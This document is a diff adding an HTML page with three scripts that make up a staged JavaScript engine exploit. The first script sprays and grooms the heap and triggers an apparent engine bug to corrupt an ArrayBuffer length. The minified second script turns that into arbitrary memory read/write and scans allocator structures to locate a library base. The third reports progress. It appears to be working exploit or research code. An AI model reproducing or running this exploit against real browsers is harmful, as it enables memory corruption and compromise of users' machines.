@@ -1,0 +1,53 @@
+<!doctype html><body><div id="v">Ok</div><script id="stageA">"use strict";
+function f([] = eval("[]")) { var q1 = 0, q2 = 0, q3 = 0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; }
+var SY = new Array(65600);
+for (var i = 0; i < 65600; i++) SY[i] = Symbol();
+/* keep only a window of the last symbols: the atom array stays
+   large and slot 65535 stays live; the other symbol strings are
+   freed to reclaim heap. */
+var KEEP = SY.slice(65600 - 3000); SY = null;
+var RT = [4,0,0,0,5,0,0,0,4,0,0,0,4,0,0,0,4,0,0,0], RJ = [4,0,0,0,5,0,0,0,255,255,0,0,4,0,0,0,4,0,0,0];
+var PB = new Uint8Array(2544);
+var A = new Array(1100), UV = new Array(1100);
+for (var i = 0; i < 1100; i++) { A[i] = new ArrayBuffer(2544); }
+for (var i = 0; i < 1100; i++) { UV[i] = new Uint8Array(A[i]); }
+var D = new Array(3000);
+for (var i = 0; i < 3000; i++) D[i] = new ArrayBuffer(64);
+var T = new Array(600);
+for (var i = 0; i < 600; i++) T[i] = new ArrayBuffer(64);
+T[600-2] = null;
+var mark = "NOCORR";
+function fill(p, q) {
+  PB.fill(0);
+  for (var o = p; o + 40 <= 2544; o += 40) {
+    for (var k = 0; k < 20; k++) { PB[o + k] = (q ? RJ[k] : RT[k]); PB[o + 20 + k] = (q ? RT[k] : RJ[k]); }
+  }
+  for (var i = 0; i < 1100; i++) UV[i].set(PB);
+}
+var hit = 0;
+for (var ph = 0; ph < 20 && !hit; ph += 4) {
+  for (var q = 0; q < 2 && !hit; q++) {
+    fill(ph, q);
+    try { f(); } catch (e) {}
+    for (var i = 0; i < 600; i++) {
+      if (T[i] !== null && T[i].byteLength > 1024) {
+        hit = 1; mark = "ABLEN[" + i + "]=" + T[i].byteLength;
+        break;
+      }
+    }
+  }
+}
+var V = null, VAB = null;
+for (var i = 0; i < 600; i++) { if (T[i] !== null && T[i].byteLength > 1024) { VAB = T[i]; break; } }
+if (VAB) { try { V = new Uint8Array(VAB); mark += " VLEN=" + V.length; } catch (e2) { mark += " VERR=" + e2; } }
+globalThis.V = V; globalThis.VAB = VAB; globalThis.T = T;
+throw new Error("RESULT " + mark);
+</script><script id="stageB">!function(){var r=281474976710656,n="";try{var i=globalThis.V,t=(globalThis.VAB,globalThis.T);if(!i||327744!==i.length)throw"NOV";var f,o,a=function(r){return(i[r]|i[r+1]<<8|i[r+2]<<16|i[r+3]<<24)>>>0},u=function(r){return i[r]|i[r+1]<<8},e=function(r){var n=a(r);return 4294967296*a(r+4)+n},v=function(n){return n%r},l=function(n){return(n=v(n))>65536&&n<r-1&&n%8==0},h=function(n){return(n=v(n))>65536&&n<r-1&&n%1==0},c=function(r,n){i[r]=255&n,i[r+1]=n>>>8&255,i[r+2]=n>>>16&255,i[r+3]=n>>>24&255},A=function(r,n){var i=n%4294967296,t=Math.floor(n/4294967296);c(r,i),c(r+4,t)},g=-1,B=0,b=null,s=0;for(f=0;f+24<327744&&!b&&s<400;f+=8)if(64===a(f)&&4294967295===a(f+4)&&l(e(f+16))&&0===u(f+8)){s++;var S=e(f+16);for(c(f,74565),o=0;o<t.length;o++)if(t[o]&&74565===t[o].byteLength){b=t[o],g=f,B=S;break}b||c(f,64)}if(!b)throw"NOABX";var E,T,R=Math.floor(B/r),N=function(n){return Math.floor(n/r)===R&&n%r>65536&&n%8==0},O=function(r,n){E=function(r,n){c(g,n),A(g+16,r);var i=new Uint8Array(b);return c(g,74565),A(g+16,B),i}(r,n),T=r},G=function(r){return E[r-T]},H=function(r){var n=r-T;return E[n]|E[n+1]<<8},L=function(r){var n=r-T,i=(E[n]|E[n+1]<<8|E[n+2]<<16|E[n+3]<<24)>>>0;return 4294967296*((E[n+4]|E[n+5]<<8|E[n+6]<<16|E[n+7]<<24)>>>0)+i},M=function(r){O(r-256,512)};O(B-8192,16384);var V,F=H(B-8),d=G(B-6),D=[16,24,32,40,48,56,64,72,80,88,96,104,112,120,128,144,160,176,192,208,224,240,256,288,320,352,384,416,448,480,512][d],k=0;if(!D)return globalThis.SLABV="BADBS",void(globalThis.MEGA="HF ERR BADBS");if(V=L(B-8-F*D-48+32),!l(V))return globalThis.SLABV="NOSLAB",void(globalThis.MEGA="HF ERR NOSLAB");if(O(V-256,512),k=L(V+16),!l(k)||v(k)%4096!=0)return globalThis.SLABV="NOBASE H="+F+" D="+d+" BS="+D+" SLAB="+V+" SBASE="+k,void(globalThis.MEGA="HF ERR NOBASE");k=v(k),globalThis.SLABV="";var w=[k],y=function(r,n,i){var t,f,o,a=r;for(t=0;t<256&&(M(a),f=L(a+n),l(f)&&f!==r);t++){if(M(f),o=L(f+16),l(o)&&v(o)%4096==0){o=v(o);var u,e=0;for(u=0;u<i.length;u++)if(i[u]===o){e=1;break}e||i.push(o)}a=f}};y(V,8,w),y(V,0,w);var X=function(r){if((r=v(r))<65536)return!1;for(var n=0;n<w.length;n++){var i=w[n];if(r>=i&&r<i+65536)return!0}return!1},p=[],C=function(r){if(N(r)){M(r);var n,i,t,f,o=L(r+16),a=H(r+24);if(l(o)&&v(o)%4096==0)for(o=v(o),O(o,65536),n=0;n<16;n++)if(a&1<<n){var u=o+4096*n;if(12===G(u+40))for(f=4048/112,t=0;t<f;t++)H((i=u+48+8+112*t)-8)===t&&20===H(i+18)&&p.length<4096&&p.push(i)}}};C(V);var x,U=V,Y=0;for(Y=0;Y<256&&N(U)&&(M(U),x=L(U+8),l(x)&&x!==V);Y++)C(x),U=x;for(U=V,Y=0;Y<256&&N(U)&&(M(U),x=L(U),l(x)&&x!==V);Y++)C(x),U=x;var j=[8388608,6291456,4194304],m=function(r){if(!N(r))return $=0,0;M(r);var n=L(r+24);if(!N(n)||!X(n))return $=1,0;M(n);var i=L(n+48);if(!N(i)||!X(i))return $=2,0;M(i);var t=L(i+32);if(!N(t)||!X(t))return $=3,0;M(t);var f,o,a=0;for(f=0;f<32;f++)if(o=L(t+16*f),0x10000000000000000===L(t+16*f+8))if(N(o)&&X(o)){if(M(o),12===H(o+18)){a=o;break}M(t)}else $=4;if(!a)return $=5,0;M(a);var u=L(a+56);if(!h(u))return $=6,0;var e=L(a+48);if(!N(e))return $=7,0;O(e-256,512);var c=L(e+16);if(!N(c)||!function(r){if(!l(r))return!1;O(r-256,512);var n=L(r+56);return n===j[0]||n===j[1]||n===j[2]}(c))return $=8,0;O(c-256,512);var A=L(c+16);if(!h(A))return 0;var g=v(A)-65847;return g<65536||g%4096!=0?($=9,0):[e,c,A,g]},q=0,z=0,I=-1,J=-1,K=-1,P=p.length,Q=w.length,W=-1,Z=-1,$=0;for(o=0;o<p.length&&!q;o++){var _=m(p[o]);!_&&Z<0&&(Z=$),q=_}for(f=0;f+48<327744&&!q;f+=8)if(20===u(f+18)){z++,I<0?I=f:J<0?J=f:K<0&&(K=f);var rr=m(B+f);!rr&&W<0&&(W=$,f),q=rr}if(!q&&N(B-32768)){O(B-32768,360512);var nr=0,ir=-1,tr=-1,fr=-1;for(f=0;f+48<360512&&!q;f+=8)if(20===H(B-32768+f+18)){nr++,ir<0?ir=f:tr<0?tr=f:fr<0&&(fr=f);var or=m(B-32768+f);!or&&W<0&&(W=$,f-32768),q=or}z+=nr,I<0?I=ir-32768:J<0?J=ir-32768:K<0&&(K=ir-32768)}var ar=" NC="+z+" G="+P+" GS="+Q+" X="+W+" XG="+Z+" O="+I+","+J+","+K;return void(globalThis.MEGA=q?"HF READY"+ar:"HF ERR NOANCHOR"+ar)}catch(r){n="ERR "+r}globalThis.MEGA="HF "+n}();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         </script><script id="stageC">if (1) { try {
+var m=(typeof mark!=="undefined")?mark:"-";
+var e=(typeof MEGA!=="undefined")?MEGA:"-";
+var v=(typeof SLABV!=="undefined")?SLABV:"-";
+var x="S1 "+m+" END="+e+" SV="+v;
+try { var D=document.getElementById("v"); if (D) D.textContent=x; } catch(e) {}
+try { console.log(x); } catch(e) {}
+} catch(e) {} }
+/*PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP*/</script>
